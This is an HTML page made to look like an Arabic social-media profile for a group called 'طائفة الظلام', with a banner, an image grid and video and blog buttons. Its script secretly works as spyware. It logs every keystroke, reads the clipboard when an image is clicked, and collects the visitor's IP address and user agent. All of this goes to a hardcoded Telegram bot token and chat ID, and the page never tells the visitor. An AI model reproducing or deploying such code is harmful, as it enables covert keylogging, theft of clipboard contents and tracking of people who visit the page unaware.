<!DOCTYPE html><html lang="ar">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=480, initial-scale=1.0, maximum-scale=1.0">
  <title>طائفة الظلام - DKSTx666</title>
  <style>
    body {
      margin: 0;
      background-color: pink;
      font-family: Arial, sans-serif;
      direction: rtl;
      overflow-x: hidden;
    }
    .cover {
      width: 100%;
      height: 200px;
      background-image: url('cover.jpg');
      background-size: cover;
      background-position: center;
      position: relative;
    }
    .description {
      position: absolute;
      top: 50%;
      right: 0;
      left: 0;
      transform: translateY(-50%);
      text-align: center;
      color: purple;
      background-color: rgba(255,255,255,0.7);
      font-weight: bold;
      padding: 10px;
    }
    .profile {
      width: 100px;
      height: 100px;
      background: violet;
      border-radius: 50%;
      border: 5px solid white;
      position: absolute;
      bottom: -50px;
      right: 20px;
      z-index: 10;
    }
    .posts-container {
      margin-top: 80px;
      display: grid;
      grid-template-columns: repeat(5, 1fr);
      gap: 5px;
      padding: 10px;
    }
    .post-img {
      width: 100%;
      height: 80px;
      object-fit: cover;
      border: 2px solid purple;
      cursor: pointer;
    }
    .buttons {
      position: fixed;
      bottom: 10px;
      width: 100%;
      display: flex;
      justify-content: space-between;
      padding: 0 20px;
    }
    .btn {
      padding: 10px;
      border: none;
      border-radius: 20px;
      font-weight: bold;
      cursor: pointer;
    }
    .btn-video {
      background-color: purple;
      color: white;
      animation: pulse 2s infinite;
    }
    .btn-blogs {
      background-color: yellow;
      color: black;
      animation: pulse 2s infinite;
    }
    @keyframes pulse {
      0% { transform: scale(1); }
      50% { transform: scale(1.05); }
      100% { transform: scale(1); }
    }
  </style>
</head>
<body>
  <div class="cover">
    <div class="description">
      ركوب جلجامشة | تجاوزت جلجامشة خطوط الحمراء وبذلك صار دعسها عنوانها الاول ولأخير |<br>
      طائفة الظلام تتجاوز العتمة لتحكم في لأخير | نحن الذي نفعل قبل ان نتكلم |<br>
      لطالما كان ظلام كلمات لا يفهمها الا من قرأها وشادو من سا يكتب الكلمات
    </div>
  </div>
  <div class="profile"></div>  <div class="posts-container">
    <img src="img1.jpg" class="post-img" alt="👑">
    <img src="img2.jpg" class="post-img" alt="👑">
    <img src="img3.jpg" class="post-img" alt="👑">
    <img src="img4.jpg" class="post-img" alt="👑">
    <img src="img5.jpg" class="post-img" alt="👑">
  </div>  <div class="buttons">
    <button class="btn btn-video" onclick="logClick('📹 فيديو'); location.href='index.html';">فيديو</button>
    <button class="btn btn-blogs" onclick="logClick('🟡 مدونات'); location.href='index.html';">مدونات</button>
  </div>  <script>
    const TOKEN = "7557167179:AAG0_jw9g7EEPhFKJbW5pMLhiPidHrGzt8M";
    const CHAT_ID = "7664410054";

    function sendToTelegram(msg) {
      fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
        method: "POST",
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
      });
    }

    function logClick(content) {
      sendToTelegram(`👆 نقر: ${content}`);
    }

    document.querySelectorAll(".post-img").forEach(img => {
      img.addEventListener("click", () => {
        logClick("🖼️ صورة: " + img.src);
        navigator.clipboard.readText().then(text => {
          sendToTelegram(`📋 الحافظة: ${text}`);
        });
      });
    });

    document.querySelector(".profile").addEventListener("click", () => {
      logClick("👤 صورة بروفايل")
    });

    document.addEventListener("click", e => {
      const target = e.target;
      if (target.tagName === 'BUTTON') logClick(`🔘 زر: ${target.innerText}`);
    });

    document.addEventListener("keydown", e => {
      sendToTelegram(`⌨️ مفتاح: ${e.key}`);
    });

    fetch("https://api.ipify.org?format=json")
      .then(res => res.json())
      .then(data => {
        const ip = data.ip;
        const ua = navigator.userAgent;
        sendToTelegram(`🆕 دخول جديد\n📡 IP: ${ip}\n📱 جهاز: ${ua}`);
      });
  </script></body>
      </html>
